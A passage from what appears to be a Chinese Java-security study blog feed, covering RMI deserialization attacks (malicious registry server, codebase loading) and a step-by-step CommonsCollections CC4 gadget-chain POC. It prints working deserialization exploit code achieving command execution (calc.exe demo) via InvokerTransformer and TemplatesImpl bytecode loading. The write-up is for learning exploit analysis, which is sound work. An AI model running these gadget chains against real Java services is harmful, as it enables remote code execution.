function_">getUser</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformerChain);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">construct</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br>        construct.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, handler);<br>        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);<br><br>        <span class="hljs-keyword">return</span> handler;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>恶意服务端将恶意对象注册到注册中心</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilClassServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">liming</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServerReturnObject</span>(<span class="hljs-string">&quot;liming&quot;</span>,<span class="hljs-number">15</span>);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        registry.bind(<span class="hljs-string">&quot;user&quot;</span>,liming);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>客户端获取恶意对象，调用 getUser() 方法，反序列化恶意远程对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (User)registry.lookup(<span class="hljs-string">&quot;user&quot;</span>);<br>        user.getUser();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104061.png"></p><h5 id="远程加载对象"><a href="#远程加载对象" class="headerlink" title="远程加载对象"></a><font style="color:rgb(80, 80, 92);">远程加载对象</font></h5><blockquote><p>《Java 安全漫谈》</p><p>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的</p><p>CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。</p><p>如果我们指定 codebase&#x3D;<a href="http://example.com/">http://example.com/</a> ，然后加载 org.vulhub.example.Example 类，则</p><p>Java虚拟机会下载这个文件 <a href="http://example.com/org/vulhub/example/Example.class">http://example.com/org/vulhub/example/Example.class</a> ，并作为</p><p>Example类的字节码。</p><p>RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻</p><p>找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在</p><p>本地没有找到这个类，就会去远程加载codebase中的类。</p><p>这个时候问题就来了，如果codebase被控制，我们不就可以加载恶意类了吗？</p><p>对，在RMI中，我们是可以将codebase随着序列化数据一起传输的，服务器在接收到这个数据后就会去</p><p>CLASSPATH和指定的codebase寻找类，由于codebase被控制导致任意命令执行漏洞。</p><p>不过显然官方也注意到了这一个安全隐患，所以只有满足如下条件的RMI服务器才能被攻击：</p><ul><li>安装并配置了SecurityManager</li><li>Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly&#x3D;false</li></ul><p>其中 java.rmi.server.useCodebaseOnly 是在Java 7u21、6u45的时候修改的一个默认设置：</p><p><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html</a></p><p><a href="https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html">https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html</a></p><p>官方将 java.rmi.server.useCodebaseOnly 的默认值由 false 改为了 true 。在 java.rmi.server.useCodebaseOnly 配置为 true 的情况下，Java虚拟机将只信任预先配置好的 codebase ，不再支持从RMI请求中获取。</p></blockquote><h3 id="4-3-攻击服务端"><a href="#4-3-攻击服务端" class="headerlink" title="4.3 攻击服务端"></a>4.3 攻击服务端</h3><p>这一部分同样是熟悉的 unmarshalValue ,</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242105634.png"></p><p><strong>服务端调用方法时，存在非基础类型的参数时，就会被恶意 Client 端传入恶意数据触发反序列化</strong></p><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p>官方文档</p><p><a href="https://docs.oracle.com/javase/tutorial/rmi/overview.html">https://docs.oracle.com/javase/tutorial/rmi/overview.html</a></p><p><font style="color:rgb(34, 34, 38);">从懵逼到恍然大悟之Java中RMI的使用</font></p><p><a href="https://blog.csdn.net/lmy86263/article/details/72594760">https://blog.csdn.net/lmy86263/article/details/72594760</a></p><p><font style="color:rgb(51, 51, 51);">JAVA安全基础（四）– RMI机制</font></p><p><a href="https://xz.aliyun.com/news/8760">https://xz.aliyun.com/news/8760</a></p><p><font style="color:rgb(68, 68, 68);">一文回顾攻击Java RMI方式</font></p><p><a href="https://www.anquanke.com/post/id/263726#h2-5">https://www.anquanke.com/post/id/263726#h2-5</a></p><p>Java RMI 攻击由浅入深</p><p><a href="https://su18.org/post/rmi-attack/">https://su18.org/post/rmi-attack/</a></p><p><a href="https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/">https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</a></p><p><a href="https://www.cnblogs.com/pihaochen/p/11020596.html"><font style="color:rgb(89, 182, 215);">https://www.cnblogs.com/pihaochen/p/11020596.html</font></a></p><p><a href="https://xz.aliyun.com/t/9053"><font style="color:rgb(89, 182, 215);">https://xz.aliyun.com/t/9053</font></a></p><p><a href="https://xz.aliyun.com/t/7930"><font style="color:rgb(89, 182, 215);">https://xz.aliyun.com/t/7930</font></a></p><p><a href="https://xz.aliyun.com/t/6660"><font style="color:rgb(89, 182, 215);">https://xz.aliyun.com/t/6660</font></a></p><p><a href="https://xz.aliyun.com/t/7079"><font style="color:rgb(89, 182, 215);">https://xz.aliyun.com/t/7079</font></a></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java 学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CC4_CC2_CC5_CC7</title>
    <link href="/2025/09/02/CC4_CC2_CC5_CC7/"/>
    <url>/2025/09/02/CC4_CC2_CC5_CC7/</url>
    
    <content type="html"><![CDATA[<h1 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h1><h2 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h2><ul><li><font style="color:rgb(80, 80, 92);">Commons-Collections 4.0</font></li></ul><p><a href="https://mvnrepository.com/artifact/org.apache.commons/commons-collections4/4.0">https://mvnrepository.com/artifact/org.apache.commons/commons-collections4/4.0</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons-collections4 --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>JDK 8u65</li></ul><h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><p>以 <font style="color:#080808;background-color:#ffffff;">ChainedTransformer.transform 为出发点，往回找</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021852635.png"></p><p><font style="color:#080808;background-color:#ffffff;">找到 TransformingComparator.compare 中调用了 transform 方法</font></p><p><font style="color:#080808;background-color:#ffffff;">再找到 PriorityQueue 类中：</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021852526.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021852926.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853566.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853113.png"></p><p><font style="color:#080808;background-color:#ffffff;"></font></p><p>最后找到的链也就是：</p><p><font style="color:#080808;background-color:#ffffff;">PriorityQueue.</font></p><p><font style="color:#080808;background-color:#ffffff;">readObject</font></p><p><font style="color:#080808;background-color:#ffffff;">heapify</font></p><p><font style="color:#080808;background-color:#ffffff;">siftDown</font></p><p><font style="color:#080808;background-color:#ffffff;">siftDownUsingComparator</font></p><p><font style="color:#080808;background-color:#ffffff;">compare</font></p><p><font style="color:#080808;background-color:#ffffff;">TransformingComparator.compare.transform</font><strong><font style="color:#080808;background-color:#ffffff;"></font></strong></p><p><font style="color:#080808;background-color:#ffffff;">ChainedTransformer.transform</font></p><p><font style="color:#080808;background-color:#ffffff;">PriorityQueue.readObject.heapify.siftDown.siftDownUsingComparator.compare</font></p><p>-&gt;</p><p><font style="color:#080808;background-color:#ffffff;">TransformingComparator.compare.transform</font></p><p>-&gt;</p><p><font style="color:#080808;background-color:#ffffff;">ChainedTransformer.transform</font></p><p><font style="color:#080808;background-color:#ffffff;"></font></p><h2 id="编写-POC："><a href="#编写-POC：" class="headerlink" title="编写 POC："></a><font style="color:#080808;background-color:#ffffff;">编写 POC：</font></h2><p>先将 CC3 的代码执行部分拿来：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//代码执行 InstantiateTransformer</span><br><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br><span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>nameFiled.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br><span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>bytecodesFiled.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br><span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>bytecodesFiled.set(templates, codes);<br><br><span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>    instantiateTransformer<br>&#125;;<br><br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;(transformers);<br></code></pre></td></tr></table></figure><p><font style="color:#080808;background-color:#ffffff;">对照源码进行构造：</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);<br><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br></code></pre></td></tr></table></figure><p><font style="color:#080808;background-color:#ffffff;">写好之后，发现没有反应</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853126.png"></p><p>调试来到此处：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853395.png"></p><p>看到 size:0 ，不会进入 siftDown.</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853636.png"><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853140.png"><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853829.png"></p><blockquote><p><code>for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)</code></p><h3 id="1-size-1"><a href="#1-size-1" class="headerlink" title="1. size &gt;&gt;&gt; 1"></a>1. <code>size &gt;&gt;&gt; 1</code></h3><ul><li><code>&gt;&gt;&gt;</code> 是 <strong>无符号右移运算符</strong>。</li><li><code>size &gt;&gt;&gt; 1</code> 等价于 <code>size / 2</code>（向下取整），但不同于 <code>/2</code> 的地方在于：<ul><li><code>/2</code> 是普通的除法运算；</li><li><code>&gt;&gt;&gt; 1</code> 是位运算，执行效率更高（尤其是在底层算法里）。</li></ul></li></ul><p>所以 <code>size &gt;&gt;&gt; 1</code> 就是 <strong>数组长度的一半</strong>。</p><h3 id="2-size-1-1"><a href="#2-size-1-1" class="headerlink" title="2. (size &gt;&gt;&gt; 1) - 1"></a>2. <code>(size &gt;&gt;&gt; 1) - 1</code></h3><ul><li>先取数组长度的一半，再减去 1。</li><li>结果是 <strong>从数组的最后一个非叶子节点开始的位置</strong>。</li></ul><p>例如在堆排序或优先队列的实现中：</p><ul><li>叶子节点的下标范围是 <code>size/2 ~ size-1</code>。</li><li>非叶子节点的最后一个位置就是 <code>(size/2)-1</code>。</li></ul><h3 id="3-for-int-i-i-0-i"><a href="#3-for-int-i-i-0-i" class="headerlink" title="3. for (int i = ...; i &gt;= 0; i--)"></a>3. <code>for (int i = ...; i &gt;= 0; i--)</code></h3><ul><li><code>i</code> 从 <code>(size &gt;&gt;&gt; 1) - 1</code> 开始，递减到 <code>0</code>。</li><li>也就是说：<strong>循环会从最后一个非叶子节点开始，往前遍历所有非叶子节点，直到根节点</strong>。</li></ul><p>这是一个建堆（heapify）的实现。作用是：<strong>从最后一个非叶子节点开始，依次向前调整，直到把整个数组调整成一个堆结构</strong>。  </p></blockquote><p>所以要保证 size 为 2 才能进入 for 循环执行代码</p><p>于是添加：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">priorityQueue.add(<span class="hljs-number">1</span>);<br>priorityQueue.add(<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><p>此时执行代码后报错了</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021853681.png"></p><p>跟进 add 函数：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854556.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854839.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854687.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854246.png"></p><p>发现 add 函数也会调用 <font style="color:#080808;background-color:#ffffff;">compare，而当 add 调用 compare 也就会调用 </font>transform</p><p>而我们知道 _tfactory 在反序列化的时候才会被赋值【CC3 中分析 利用 TemplatesImpl 加载字节码 时提及】</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854728.png"></p><p>所以，先给  <font style="color:#080808;background-color:#ffffff;">transformers&#x2F;chainedTransformer 传一个没用的东西，让 add 执行时不会调用</font></p><p><font style="color:#080808;background-color:#ffffff;">compare.transform ,在反序列化时再赋给正常值。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;(transformers);<br><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-comment">//TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer);</span><br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformerField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformerField.setAccessible(<span class="hljs-literal">true</span>);<br>        transformerField.set(transformingComparator, chainedTransformer);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure><p>这样就可以正常执行了</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854475.png"></p><h3 id="完整的POC："><a href="#完整的POC：" class="headerlink" title="完整的POC："></a>完整的POC：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.CC4;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">//代码执行 InstantiateTransformer</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesFiled.set(templates, codes);<br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>            instantiateTransformer<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title 